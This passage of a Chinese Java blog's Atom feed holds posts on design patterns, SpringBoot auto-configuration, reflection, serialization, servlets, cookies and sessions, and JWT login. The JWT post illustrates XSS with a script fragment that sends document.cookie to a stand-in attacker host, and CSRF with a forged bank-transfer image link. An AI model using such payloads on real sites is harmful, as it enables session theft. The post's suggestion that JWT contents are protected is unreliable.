src="http://pv4qgqg7s.bkt.clouddn.com/static/images/design_mode/1.png"><p>可见：我们使用多态动态调用了<code>doCoding()</code>方法，我们在需要修改实现的时候只需要需要修改接口对应的实现就可以了，而不需要修改子类的方法</p><p>当然，我们不应该在开发中使用初始化时创建实现类的这种方式，我们可以在<code>基类</code>中添加一个<code>setProgramBehavior</code>的方法，这样我们就可以在应用中动态的设置行为</p><pre><code class="java">void setProgramBehavior(ProgramBehavior programBehavior){        this.programBehavior = programBehavior;}</code></pre><p>我们为AIProgramer在执行完睡觉后2秒设置一个新的写代码行为（退休）并调用</p><pre><code class="java">public class RetireBehavior implements ProgramBehavior {    @Override    public void doCoding() {        System.out.println(&quot;I am retired just few days.&quot;);    }}</code></pre><img src="http://pv4qgqg7s.bkt.clouddn.com/static/images/design_mode/2.png"><p>该AIProgramer类图如下</p><img src="http://pv4qgqg7s.bkt.clouddn.com/static/images/design_mode/3.png"><blockquote><p>至此，这就是整个策略模式的设计方法，我们再来理一遍，也许你再去看策略模式的定义就没问题了（代码最后附上）</p></blockquote><p>我们把行为中（每个行为可以看成一个算法，形成了算法族）变化的部分从基类抽象类中抽取出来，使用接口定义并使用类实现接口来实现某一个行为（算法）不同的表现，再利用<code>多态</code>的神奇之处动态调用接口不同实现类的同一方法；然后我们需要改变接口实现类的实现方法（算法）时对调用该方法的客户完成不需要更改，没有任何影响。</p><p>代码地址：</p><p> <a href="https://github.com/ding-zou/design_mode" rel="external nofollow noopener noreferrer" target="_blank">https://github.com/ding-zou/design_mode</a></p>]]></content>
    
    <summary type="html">
    
      Java设计模式之策略模式：定义了算法族，分别封装起来，让他们之间可以相互替换，此模式让算法的变化独立于使用算法的客户。
    
    </summary>
    
      <category term="Java基础" scheme="https://www.dzou.top/categories/Java%E5%9F%BA%E7%A1%80/"/>
    
    
      <category term="Java" scheme="https://www.dzou.top/tags/Java/"/>
    
      <category term="基础" scheme="https://www.dzou.top/tags/%E5%9F%BA%E7%A1%80/"/>
    
      <category term="设计模式" scheme="https://www.dzou.top/tags/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/"/>
    
      <category term="面试" scheme="https://www.dzou.top/tags/%E9%9D%A2%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>SpringBoot自动配置源码分析及详解</title>
    <link href="https://www.dzou.top/post/366ffd58.html"/>
    <id>https://www.dzou.top/post/366ffd58.html</id>
    <published>2019-08-02T11:32:01.000Z</published>
    <updated>2019-08-02T12:11:53.759Z</updated>
    
    <content type="html"><![CDATA[<h2 id="SpringBoot自动配置"><a href="#SpringBoot自动配置" class="headerlink" title="SpringBoot自动配置"></a>SpringBoot自动配置</h2><p>我们都知道一个SpringBoot主配置类只要标注上<u>@SpringBootApplication</u>的注解，Spring就会帮我们自动配置各个组件和实例化Bean，我们来通过源码分析一下SpringBoot自动配置原理。</p><p>首先我们要知道，SpringBoot将符合条件的@Configuration类都加载到Spring容器中，就像一只八爪鱼，我们的启动类就是一个典型的@Configuration类。</p><h3 id="SpringBootApplication"><a href="#SpringBootApplication" class="headerlink" title="@SpringBootApplication"></a>@SpringBootApplication</h3><p>包括下面两个关键的注解</p><pre><code class="java">@SpringBootConfiguration@EnableAutoConfiguration</code></pre><p>其中@SpringBootConfiguration 就是get主配置类添加上@Configuration 注解让主配置类的自动配置能被扫描到</p><p>下面我们主要分析一下@EnableAutoConfiguration 注解</p><h3 id="EnableAutoConfiguration"><a href="#EnableAutoConfiguration" class="headerlink" title="@EnableAutoConfiguration"></a>@EnableAutoConfiguration</h3><p>其中也包含两个关键注解</p><pre><code class="java">@AutoConfigurationPackage@Import({AutoConfigurationImportSelector.class})</code></pre><ul><li>第一个用作包扫描自动配置</li><li>第二个导入AutoConfigurationImportSelector类用作SpringBoot提供的其他组件的自动配置选择器</li></ul><p>我们先看一下第一个</p><h4 id="AutoConfigurationPackage"><a href="#AutoConfigurationPackage" class="headerlink" title="@AutoConfigurationPackage"></a>@AutoConfigurationPackage</h4><p>这个注解导入了SpringBoot中的Registrar类 用作包路径下的Bean扫描并注册到BeanFactory中</p><pre><code class="java">@Import({Registrar.class})</code></pre><p>详细看一下这个类</p><h4 id="Registrar注册类"><a href="#Registrar注册类" class="headerlink" title="Registrar注册类"></a>Registrar注册类</h4><p>其中主要的方法是registerBeanDefinitions</p><pre><code class="java">static class Registrar implements ImportBeanDefinitionRegistrar, DeterminableImports {    public void registerBeanDefinitions(AnnotationMetadata metadata, BeanDefinitionRegistry registry) {        //获取到元信息的包名传入注册器        AutoConfigurationPackages.register(registry, (new AutoConfigurationPackages.PackageImport(metadata)).getPackageName());    }</code></pre><p>传入两个参数：</p><ul><li>metadata 启动类元信息</li><li>registry 用作注册的Bean注册器</li></ul><p>目录结构如下：</p><img src="http://pv4qgqg7s.bkt.clouddn.com/static/images/autoconfig/9.png"><p>元信息如下：</p><img src="http://pv4qgqg7s.bkt.clouddn.com/static/images/autoconfig/2.png"><p>new AutoConfigurationPackages.PackageImport(metadata)).getPackageName()获取到该启动类所在路径的包名，传如register方法注册该包名下的所有需要注册并实例化的Bean（包括@Component @Service @Mapper @Repository等）</p><img src="http://pv4qgqg7s.bkt.clouddn.com/static/images/autoconfig/3.png"><h5 id="AutoConfigurationPackages中register方法"><a href="#AutoConfigurationPackages中register方法" class="headerlink" title="AutoConfigurationPackages中register方法"></a>AutoConfigurationPackages中register方法</h5><pre><code class="java">public static void register(BeanDefinitionRegistry registry, String... packageNames) </code></pre><p>根据传入的register和包名packageName注册该包名下的所有需要注册并实例化的Bean</p><p>其中我们要关注的是下面这段代码：</p><ul><li>GenericBeanDefinition 创建Bean的一站式组件，包括Bean的参数、属性、类的信息</li></ul><pre><code class="java">//新建一个GenericBeanDefinition描述Bean的实例GenericBeanDefinition beanDefinition = new GenericBeanDefinition();       //设置bean的类名称beanDefinition.setBeanClass(AutoConfigurationPackages.BasePackages.class);//获取构造器参数并保存beanDefinition.getConstructorArgumentValues().addIndexedArgumentValue(0, packageNames);//Bean的角色 感兴趣的可以去了解一下，有0,1,2对应三种不同角色beanDefinition.setRole(2);//参数设置完调用registerBeanDefinition注册并实例化Beanregistry.registerBeanDefinition(BEAN, beanDefinition);}</code></pre><h6 id="getConstructorArgumentValues"><a href="#getConstructorArgumentValues" class="headerlink" title="getConstructorArgumentValues"></a>getConstructorArgumentValues</h6><p>这个方法用于获取构造器参数并保存</p><ul><li>ConstructorArgumentValues 是一个构造器参数保存器，保存Bean的构造方法的参数</li></ul><pre><code class="java">public ConstructorArgumentValues getConstructorArgumentValues() {    if (this.constructorArgumentValues == null) {        //创建一个新的构造器参数保存器        this.constructorArgumentValues = new ConstructorArgumentValues();    }    return this.constructorArgumentValues;}</code></pre><h6 id="DefaultListableBeanFactory中实现的registerBeanDefinition方法"><a href="#DefaultListableBeanFactory中实现的registerBeanDefinition方法" class="headerlink" title="DefaultListableBeanFactory中实现的registerBeanDefinition方法"></a>DefaultListableBeanFactory中实现的registerBeanDefinition方法</h6><p>该方法对GenericBeanDefinition创建的Bean进行注册到BeanFactory</p><p>传入beanName和beanDefinition</p><pre><code class="java">public void registerBeanDefinition(String beanName, BeanDefinition beanDefinition)</code></pre><ul><li>检查完Bean是否合法后先判断是否存在相同Bean的注册，存在抛出异常，不存在执行如下</li></ul><p>其中主要代码如下：</p><pre><code class="java">//开始注册Bean//如果已启动注册状态则要加锁注册单例singletonif (this.hasBeanCreationStarted()) {    synchronized(this.beanDefinitionMap) {        //把Bean存入beanDefinitionMap        this.beanDefinitionMap.put(beanName, beanDefinition);        List&lt;String&gt; updatedDefinitions = new ArrayList(this.beanDefinitionNames.size() + 1);        //把需要注册的Bean添加到map中        updatedDefinitions.addAll(this.beanDefinitionNames);        updatedDefinitions.add(beanName);        this.beanDefinitionNames = updatedDefinitions;        //默认为单例        if (this.manualSingletonNames.contains(beanName)) {            Set&lt;String&gt; updatedSingletons = new LinkedHashSet(this.manualSingletonNames);            updatedSingletons.remove(beanName);            this.manualSingletonNames = updatedSingletons;        }    }    //如果未启动直接注册无需加锁} else {    this.beanDefinitionMap.put(beanName, beanDefinition);    this.beanDefinitionNames.add(beanName);    this.manualSingletonNames.remove(beanName);}</code></pre><p>下图就是beanDefinitionMap返回的值，里面除了Spring框架提供的一些必要的Bean需要注册外，就是我们主启动类所在包下的所有需要扫描的Bean，我只有一个主启动类和一个controller 下面标出</p><img src="http://pv4qgqg7s.bkt.clouddn.com/static/images/autoconfig/4.png"><p>当我尝试把写的HelloWorldController的@RestController注解注释掉以后，SpringBoot没有扫描到这个Controller，也就没有把它注册到BeanFactory中</p><img src="http://pv4qgqg7s.bkt.clouddn.com/static/images/autoconfig/10.png"><h4 id="AutoConfigurationImportSelector"><a href="#AutoConfigurationImportSelector" class="headerlink" title="AutoConfigurationImportSelector"></a>AutoConfigurationImportSelector</h4><p>看完@AutoConfigurationPackage 注解我们看一下 @EnableAutoConfiguration另一个注解@Import({AutoConfigurationImportSelector.class}) 该注解导入了SpringBoot中AutoConfigurationImportSelector类（自动配置选择器）用作选择SpringBoot提供的所需组件Bean的选择并自动配置</p><p>主要是下面的方法</p><h5 id="getAutoConfigurationEntry方法"><a href="#getAutoConfigurationEntry方法" class="headerlink" title="getAutoConfigurationEntry方法"></a>getAutoConfigurationEntry方法</h5><p>传入两个参数</p><ul><li>autoConfigurationMetadata自顶配置元信息</li><li>annotationMetadata注解元信息</li></ul><p>注解元信息的参数（配置类上添加的@ComponentScan(Exclude)）：</p><p>excludeName和exclude表示需要排除扫描自动配置的类，String[0]表示了没有需要排除的</p><img src="http://pv4qgqg7s.bkt.clouddn.com/static/images/autoconfig/8.png"><pre><code class="java">//获取注解元信息参数AnnotationAttributes attributes = this.getAttributes(annotationMetadata);//调用getCandidateConfigurations获取需要自动配置的类或者功能List&lt;String&gt; configurations = this.getCandidateConfigurations(annotationMetadata, attributes);//去重configurations = this.removeDuplicates(configurations);//检查并排除exclude类Set&lt;String&gt; exclusions = this.getExclusions(annotationMetadata, attributes);this.checkExcludedClasses(configurations, exclusions);configurations.removeAll(exclusions);configurations = this.filter(configurations, autoConfigurationMetadata);this.fireAutoConfigurationImportEvents(configurations, exclusions);return new AutoConfigurationImportSelector.AutoConfigurationEntry(configurations, exclusions);</code></pre><img src="http://pv4qgqg7s.bkt.clouddn.com/static/images/autoconfig/7.png"><h5 id="getCandidateConfigurations"><a href="#getCandidateConfigurations" class="headerlink" title="getCandidateConfigurations"></a>getCandidateConfigurations</h5><p>负责加载META-INF/spring.factories中的配置的类，这些类就是SpringBoot提供的所需要加载的那些*AutoConfiguration类，也就是要注册的Bean或功能，获取到候选类的BeanName返回一个List</p><p>借助SpringFactoriesLoader类实现加载自动配置类</p><pre><code class="java">protected List&lt;String&gt; getCandidateConfigurations(AnnotationMetadata metadata, AnnotationAttributes attributes) {    //加载类路径下META-INF/spring.factories中的自动配置类        List&lt;String&gt; configurations = SpringFactoriesLoader.loadFactoryNames(this.getSpringFactoriesLoaderFactoryClass(), this.getBeanClassLoader());        Assert.notEmpty(configurations, &quot;No auto configuration classes found in META-INF/spring.factories. If you are using a custom packaging, make sure that file is correct.&quot;);        return configurations;    }</code></pre><p>返回结果如下:</p><img src="http://pv4qgqg7s.bkt.clouddn.com/static/images/autoconfig/1.1.png"><h6 id="loadFactoryNames"><a href="#loadFactoryNames" class="headerlink" title="loadFactoryNames"></a>loadFactoryNames</h6><p>SpringBoot使用ClassLoader类加载机制加载META-INF/spring.factories</p><p>将根据EnableAutoConfiguration类名称去加载需要的类或者功能</p><pre><code class="java">public static List&lt;String&gt; loadFactoryNames(Class&lt;?&gt; factoryClass, @Nullable ClassLoader classLoader) {        String factoryClassName = factoryClass.getName();        return (List)loadSpringFactories(classLoader).getOrDefault(factoryClassName, Collections.emptyList());    }</code></pre><blockquote><p>SpringFactoriesLoader的实现机制跟util包下的 ServiceLoader（SPL）实现机制类似，是一种服务查找机制，为接口查找服务实现类，感兴趣的可以去了解一下</p></blockquote>]]></content>
    
    <summary type="html">
    
      我们都知道一个SpringBoot主配置类只要标注上&lt;u&gt;@SpringBootApplication&lt;/u&gt;的注解，Spring就会帮我们自动配置各个组件和实例化Bean，我们来通过源码分析一下SpringBoot自动配置原理。
    
    </summary>
    
      <category term="Java Web" scheme="https://www.dzou.top/categories/Java-Web/"/>
    
    
      <category term="Java" scheme="https://www.dzou.top/tags/Java/"/>
    
      <category term="分布式" scheme="https://www.dzou.top/tags/%E5%88%86%E5%B8%83%E5%BC%8F/"/>
    
      <category term="SpringBoot" scheme="https://www.dzou.top/tags/SpringBoot/"/>
    
      <category term="Web" scheme="https://www.dzou.top/tags/Web/"/>
    
      <category term="后端" scheme="https://www.dzou.top/tags/%E5%90%8E%E7%AB%AF/"/>
    
      <category term="Spring" scheme="https://www.dzou.top/tags/Spring/"/>
    
      <category term="微服务" scheme="https://www.dzou.top/tags/%E5%BE%AE%E6%9C%8D%E5%8A%A1/"/>
    
  </entry>
  
  <entry>
    <title>Java反射机制基础--理解与使用</title>
    <link href="https://www.dzou.top/post/40dcec56.html"/>
    <id>https://www.dzou.top/post/40dcec56.html</id>
    <published>2019-07-24T02:51:07.000Z</published>
    <updated>2019-08-04T04:19:54.210Z</updated>
    
    <content type="html"><![CDATA[<h2 id="反射"><a href="#反射" class="headerlink" title="反射"></a>反射</h2><p>反射机制是<strong>运行状态</strong>中对任意一个类、对象知道它的方法和属性</p><p> <strong>JAVA反射（放射）机制：“程序运行时，允许改变程序结构或变量类型，这种语言称为动态语言”。<br>反射最重要的用途就是开发各种通用框架。很多框架（比如 Spring）都是配置化的（比如通过 XML 文件配置 Bean），为了保证框架的通用性，它们可能需要根据配置文件加载不同的对象或类，调用不同的方法，这个时候就必须用到反射，运行时动态加载需要加载的对象。</strong></p><p>一般地，我们用 instanceof 关键字来判断是否为某个类的实例。同时我们也可以借助反射中 Class 对象的 isInstance() 方法来判断是否为某个类的实例，它是一个 native 方法。</p><p><strong>创建实例</strong><br>先通过Class对象获取指定的Constructor对象，再调用Constructor对象的newInstance()方法来创建实例。这种方法可以用指定的构造器构造类的实例。</p><pre><code class="java">    //获取String所对应的Class对象    Class&lt;?&gt; c = String.class;    //获取String类带一个String参数的构造器    Constructor constructor = c.getConstructor(String.class);    //根据构造器创建实例    Object obj = constructor.newInstance(&quot;23333&quot;);    System.out.println(obj);    public native boolean isInstance(Object obj);</code></pre><h2 id="获取反射入口三种方式（Class）："><a href="#获取反射入口三种方式（Class）：" class="headerlink" title="获取反射入口三种方式（Class）："></a>获取反射入口三种方式（Class）：</h2><ul><li><p>Class.forname(全类名) 需要异常捕获 </p></li><li><p>类名.Class</p></li><li><p>对象.getClass()</p></li></ul><p><strong>获取某个Class对象的方法集合，主要有以下几个方法</strong></p><pre><code>getDeclaredMethods 方法返回类或接口声明的所有方法，包括公共、保护、默认（包）访问和私有方法，但不包括继承的方法。public Method[] getDeclaredMethods() throws SecurityExceptiongetMethods 方法返回某个类的所有公用（public）方法，包括其继承类的公用方法。public Method[] getMethods() throws SecurityExceptiongetMethod 方法返回一个特定的方法，其中第一个参数为方法名称，后面的参数为方法的参数对应Class的对象。public Method getMethod(String name, Class&lt;?&gt;... parameterTypes)</code></pre><p><strong>获取类的成员变量（字段）信息</strong></p><pre><code>getFiled：访问公有的成员变量getDeclaredField：所有已声明的成员变量，但不能得到其父类的成员变量getFileds 和 getDeclaredFields 方法用法同上（参照 Method）。</code></pre><p>当我们从类中获取了一个方法后，我们就可以用 invoke() 方法来调用这个方法。invoke 方法的原型为:</p><pre><code>public Object invoke(Object obj, Object... args)        throws IllegalAccessException, IllegalArgumentException,           InvocationTargetException</code></pre><p> <strong>如果不需要动态地创建一个对象，那么就不需要用反射</strong></p>]]></content>
    
    <summary type="html">
    
      JAVA反射（放射）机制：“程序运行时，允许改变程序结构或变量类型，这种语言称为动态语言”。反射最重要的用途就是开发各种通用框架。很多框架（比如 Spring）都是配置化的（比如通过 XML 文件配置 Bean）
    
    </summary>
    
      <category term="Java基础" scheme="https://www.dzou.top/categories/Java%E5%9F%BA%E7%A1%80/"/>
    
    
      <category term="Java" scheme="https://www.dzou.top/tags/Java/"/>
    
      <category term="基础" scheme="https://www.dzou.top/tags/%E5%9F%BA%E7%A1%80/"/>
    
      <category term="面试" scheme="https://www.dzou.top/tags/%E9%9D%A2%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>java序列化Serializable和反序列化状态修饰符transient</title>
    <link href="https://www.dzou.top/post/616dc7a4.html"/>
    <id>https://www.dzou.top/post/616dc7a4.html</id>
    <published>2019-07-24T02:46:21.000Z</published>
    <updated>2019-08-02T14:30:36.397Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Serializable序列化接口"><a href="#Serializable序列化接口" class="headerlink" title="Serializable序列化接口"></a>Serializable序列化接口</h2><p>使用序列化接口最重要的两个原因是：</p><p>1、将对象的状态保存在存储媒体中以便可以在以后重新创建出完全相同的副本；</p><p>2、按值将对象从一个应用程序域发送至另一个应用程序域。</p><p>实现serializable接口的作用是就是可以把对象存到字节流，然后可以恢复。所以你想如果你的对象没实现序列化怎么才能进行网络传输呢，要网络传输就得转为字节流，所以在分布式应用中，你就得实现序列化，如果你不需要分布式应用，那就没那个必要实现序列化。</p><h2 id="tranisent"><a href="#tranisent" class="headerlink" title="tranisent"></a>tranisent</h2><p>“不可序列化状态”。<br>打个比方，如果一个用户有一些敏感信息（譬如密码，银行卡号等），为了安全起见，不希望在网络操作（主要涉及到序列化操作，本地序列化缓存也适用）中被传输。这些信息对应的变量就可以被定义为transient类型。换句话说，这个字段的生命周期仅存于调用者的内存中。<br>如定义类：</p><pre><code class="java">    public class People implements Serializable {    private static final long serialVersionUID = 8294180014912103005L;    /**    * 用户名    */    private String username;    /**    * 密码    */    private transient String password;    }</code></pre><p>密码字段为transient，这时候如果对该对象进行序列化，这个密码字段是不会被保存的。</p>]]></content>
    
    <summary type="html">
    
      实现serializable接口的作用是就是可以把对象存到字节流，然后可以恢复。所以你想如果你的对象没实现序列化怎么才能进行网络传输呢，要网络传输就得转为字节流
    
    </summary>
    
      <category term="Java基础" scheme="https://www.dzou.top/categories/Java%E5%9F%BA%E7%A1%80/"/>
    
    
      <category term="Java" scheme="https://www.dzou.top/tags/Java/"/>
    
      <category term="基础" scheme="https://www.dzou.top/tags/%E5%9F%BA%E7%A1%80/"/>
    
      <category term="序列化" scheme="https://www.dzou.top/tags/%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>转发和重定向的区别</title>
    <link href="https://www.dzou.top/post/67d1f796.html"/>
    <id>https://www.dzou.top/post/67d1f796.html</id>
    <published>2019-07-24T02:42:22.000Z</published>
    <updated>2019-08-02T14:29:25.920Z</updated>
    
    <content type="html"><![CDATA[<h2 id="转发和重定向区别"><a href="#转发和重定向区别" class="headerlink" title="转发和重定向区别"></a>转发和重定向区别</h2><h3 id="转发"><a href="#转发" class="headerlink" title="转发"></a>转发</h3><p>forward，由服务器发出，把request、response处理权转交给其他客户端，并不会失效<br>客户首先发送一个请求到服务器端，服务器端发现匹配的servlet，并指定它去执行，当这个servlet执行完之后，它要调用getRequestDispacther()方法，把请求转发给指定的页面，在一个请求里完成</p><pre><code class="java">//转发,转发是在服务器端转发的，客户端是不知道的request.getRequestDispatcher(&quot;/index.jsp&quot;).forward(request, response);</code></pre><h3 id="重定向"><a href="#重定向" class="headerlink" title="重定向"></a>重定向</h3><p>sendRedirect，由客户端发出，请求servlet，request会失效<br> 客户发送一个请求到服务器，服务器匹配servlet，这都和请求转发一样，servlet处理完之后调用了sendRedirect()这个方法，这个方法是response的方法，所以，当这个servlet处理完之后，看到response.senRedirect()方法，立即向客户端返回这个响应，响应行告诉客户端你必须要再发送一个请求，去访问新页面，紧接着客户端受到这个请求后，立刻发出一个新的请求</p><pre><code class="java">//重定向，不会共享requestresponse.sendRedirect(&quot;/student_list.jsp&quot;);response.sendRedirect(request.getContextPath() + &quot;/student_list.jsp&quot;);</code></pre><ul><li><p>转发在服务器端完成的；重定向是在客户端完成的<br>转发的速度快；重定向速度慢</p></li><li><p>转发的是同一次请求；重定向是两次不同请求</p></li><li><p>转发不会执行转发后的代码；重定向会执行重定向之后的代码</p></li><li><p>转发地址栏没有变化；重定向地址栏有变化</p></li><li><p>转发必须是在同一台服务器下完成；重定向可以在不同的服务器下完成</p></li></ul>]]></content>
    
    <summary type="html">
    
      转发和重定向区别,forward，由服务器发出，把request、response处理权转交给其他客户端，并不会失效
    
    </summary>
    
      <category term="Java Web" scheme="https://www.dzou.top/categories/Java-Web/"/>
    
    
      <category term="Java" scheme="https://www.dzou.top/tags/Java/"/>
    
      <category term="Web" scheme="https://www.dzou.top/tags/Web/"/>
    
      <category term="基础" scheme="https://www.dzou.top/tags/%E5%9F%BA%E7%A1%80/"/>
    
  </entry>
  
  <entry>
    <title>Java中使用servlet内置对象request获取IP地址</title>
    <link href="https://www.dzou.top/post/9a42916a.html"/>
    <id>https://www.dzou.top/post/9a42916a.html</id>
    <published>2019-07-24T02:35:34.000Z</published>
    <updated>2019-08-02T12:03:02.994Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Java中使用servlet内置对象request获取IP地址"><a href="#Java中使用servlet内置对象request获取IP地址" class="headerlink" title="Java中使用servlet内置对象request获取IP地址"></a>Java中使用servlet内置对象request获取IP地址</h2><p>Controller中获取HttpServletRequest对象request，调用下面代码</p><pre><code class="java">String ip = request.getHeader(&quot;x-forwarded-for&quot;);                if(ip == null || ip.length() == 0 || &quot;unknown&quot;.equalsIgnoreCase(ip)){                    ip = request.getHeader(&quot;Proxy-Client-IP&quot;);                }                if(ip == null || ip.length() == 0 || &quot;unknown&quot;.equalsIgnoreCase(ip)){                    ip = request.getHeader(&quot;WL-Proxy-Client-IP&quot;);                }                if(ip == null || ip.length() == 0 || &quot;unknown&quot;.equalsIgnoreCase(ip)){                    ip = request.getRemoteAddr();                }</code></pre>]]></content>
    
    <summary type="html">
    
      Java中使用servlet内置对象request获取IP地址Controller中获取HttpServletRequest对象request，调用下面代码
    
    </summary>
    
      <category term="Java Web" scheme="https://www.dzou.top/categories/Java-Web/"/>
    
    
      <category term="Java" scheme="https://www.dzou.top/tags/Java/"/>
    
      <category term="Web" scheme="https://www.dzou.top/tags/Web/"/>
    
      <category term="基础" scheme="https://www.dzou.top/tags/%E5%9F%BA%E7%A1%80/"/>
    
      <category term="servlet" scheme="https://www.dzou.top/tags/servlet/"/>
    
      <category term="request" scheme="https://www.dzou.top/tags/request/"/>
    
  </entry>
  
  <entry>
    <title>cookie和session</title>
    <link href="https://www.dzou.top/post/319bf02d.html"/>
    <id>https://www.dzou.top/post/319bf02d.html</id>
    <published>2019-07-24T02:26:22.000Z</published>
    <updated>2019-08-02T14:29:54.837Z</updated>
    
    <content type="html"><![CDATA[<h2 id="session-and-cookie"><a href="#session-and-cookie" class="headerlink" title="session and cookie"></a>session and cookie</h2><h3 id="cookie"><a href="#cookie" class="headerlink" title="cookie"></a>cookie</h3><p>属性：</p><ul><li>Max-Age有效期  ：正表示相对创建时间，负表示使用默认（关闭浏览器销毁），零表示销毁</li><li>Path在url那个路径下有效（“/”）表示整个web项目下</li><li>secure：设置了属性secure，cookie只有在https协议加密情况下才会发送给服务端</li></ul><p>服务端创建cookie：<br>1.new Cookie<br>2.response.addCookie<br>3.Cookie[] cookies = request.getCookies;<br>前端：ajax获取cookie</p><p>由于http是无状态的协议，一旦客户端和服务器的数据交换完毕，就会断开连接，再次请求，会重新连接，这就说明服务器单从网络连接上是没有办法知道用户身份的。怎么办呢？那就给每次新的用户请求时，给它颁发一个身份证（独一无二）吧，下次访问，必须带上身份证，这样服务器就会知道是谁来访问了，针对不同用户，做出不同的响应。，这就是Cookie的原理。</p><p>其实cookie是一个很小的文本文件，是浏览器储存在用户的机器上的。Cookie是纯文本，没有可执行代码。储存一些服务器需要的信息，每次请求站点，会发送相应的cookie，这些cookie可以用来辨别用户身份信息等作用。</p><h3 id="session"><a href="#session" class="headerlink" title="session"></a>session</h3><p> session机制是一种服务器端的机制，服务器使用一种类似于散列表的结构（也可能就是使用散列表）来保存信息。<br>session id就是session的标识符<br>除非程序通知服务器删除一个session，否则服务器会一直保留。大部分session机制都使用会话cookie来保存session id，而关闭浏览器后这个session id就消失了，再次连接服务器时也就无法找到原来的session。<br>恰恰是由于关闭浏览器不会导致session被删除，迫使服务器为seesion设置了一个失效时间，当距离客户端上一次使用session的时间超过这个失效时间时，服务器就可以认为客户端已经停止了活动，才会把session删除以节省存储空间<br>调用 session.invalidate 使得session失效</p>]]></content>
    
    <summary type="html">
    
      其实cookie是一个很小的文本文件，是浏览器储存在用户的机器上的。Cookie是纯文本，没有可执行代码。储存一些服务器需要的信息
    
    </summary>
    
      <category term="Java Web" scheme="https://www.dzou.top/categories/Java-Web/"/>
    
    
      <category term="网络编程" scheme="https://www.dzou.top/tags/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/"/>
    
      <category term="session" scheme="https://www.dzou.top/tags/session/"/>
    
      <category term="cookie" scheme="https://www.dzou.top/tags/cookie/"/>
    
  </entry>
  
  <entry>
    <title>Jwt(Json Web Token)Web安全工具使用</title>
    <link href="https://www.dzou.top/post/d43b6d5c.html"/>
    <id>https://www.dzou.top/post/d43b6d5c.html</id>
    <published>2019-07-24T02:22:02.000Z</published>
    <updated>2019-08-02T12:02:16.082Z</updated>
    
    <content type="html"><![CDATA[<h2 id="JWT（Json-Web-Token）"><a href="#JWT（Json-Web-Token）" class="headerlink" title="JWT（Json Web Token）"></a>JWT（Json Web Token）</h2><p>主要防止token被篡改和token信息被获取，无法防止token被获取（存在cookie或者localstorage都要风险），使用cookie的httponly属性来防止xss攻击（防止使用js读取cookie值，document.cookie）</p><p><img src="https://img-blog.csdnimg.cn/20190603140012847.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0NzYwMzMy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id="token传统方式"><a href="#token传统方式" class="headerlink" title="token传统方式"></a>token传统方式</h3><p>前后端分离通过Restful API进行数据交互时，如何验证用户的登录信息及权限。在原来的项目中，使用的是最传统也是最简单的方式，前端登录，后端根据用户信息生成一个token，并保存这个 token 和对应的用户id到数据库或Session中，接着把 token 传给用户，存入浏览器 cookie，之后浏览器请求带上这个cookie，后端根据这个cookie值来查询用户，验证是否过期。</p><ul><li>xss：利用js脚本输入在网页中，如论坛等，获取你的cookie值<br>如：img src=”x” /&gt; a.src=’<a href="https://hackmeplz.com/yourCookies.png/?cookies=’" rel="external nofollow noopener noreferrer" target="_blank">https://hackmeplz.com/yourCookies.png/?cookies=’</a></li></ul><p>+document.cookie;return a}())</p><ul><li>csrf：利用你在某网站保存的cookie信息来操作你的账号，利用一张图或者链接等形式，当你访问或点击时利用你在某网站的cookie操作你的账号<br>如：&lt;img src=”” href=”<a href="http://www.yourbank.com?&amp;transfer" rel="external nofollow noopener noreferrer" target="_blank">www.yourbank.com?&amp;transfer</a> = true”</li></ul><p>jwt不能主动销毁，只能等token到期时才会自动销毁</p><h3 id="项目中的使用"><a href="#项目中的使用" class="headerlink" title="项目中的使用"></a>项目中的使用</h3><p><strong>我在项目中使用jwt来实现用户的登录，只适用于访问人数较少还需保持安全性（高并发数据库查询耗费服务器资源太多）</strong></p><p>安全防范思想：利用userId作为token的参数，创建一个token，再获取客户端ip地址，再构造一个cookie版本号，三者连接起来作为fullToken在登录时传入数据库保存，登录成功后创建一个session保持用户在网站内的登录状态，在用户注销登录的时候更改cookie的存活时间为0，更改cookie的版本号（+1），session invalidate，在访问网站时，cookie和session都被销毁，只能重新登录（会创建新的jwt更新数据库的fullToken值）<br>获取客户端ip来判断是否是你注册的时候的ip进行登录的，如果不是，无法登陆成功（保证一定的安全性）</p><h3 id="JWT组成"><a href="#JWT组成" class="headerlink" title="JWT组成"></a>JWT组成</h3><ul><li>头部(header)</li><li>载荷(payload)</li><li>签名(signature)。</li></ul><p>头部定义类型和加密方式；载荷部分放不是很重要的数据；签名使用定义的加密方式加密base64后的header和payload和一段你自己的加密key（密匙）。<br>最后的token由base64(header).base64(payload).base64(signatrue)组成。</p><p><strong>header：包含着类型和加密所用算法</strong><br><strong>payload：主要包含token存储的信息和销毁时间等</strong><br>其中userId就是token存储的最重要的信息</p><pre><code class="java">Map&lt;String, Object&gt; payload = new HashMap&lt;&gt;();            Date date = new Date();            payload.put(&quot;userId&quot;,userId.toString() );// 用户ID            payload.put(&quot;iss&quot;,&quot;face&quot;);// 生成者            payload.put(&quot;iat&quot;, date.getTime());// 生成时间            payload.put(&quot;ext&quot;, date.getTime() + 1000 * 60 * 60 * 12);// 过期时间12小时</code></pre><p><strong>signature：对头部和负载部分生成的base64值来接起来使用提供的密匙和加密方法进行加密，行成签名值</strong><br>最后一步签名的过程，实际上是对头部以及负载内容进行签名，防止内容被窜改。<br><img src="https://img-blog.csdnimg.cn/20190603135910404.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0NzYwMzMy,size_16,color_FFFFFF,t_70" 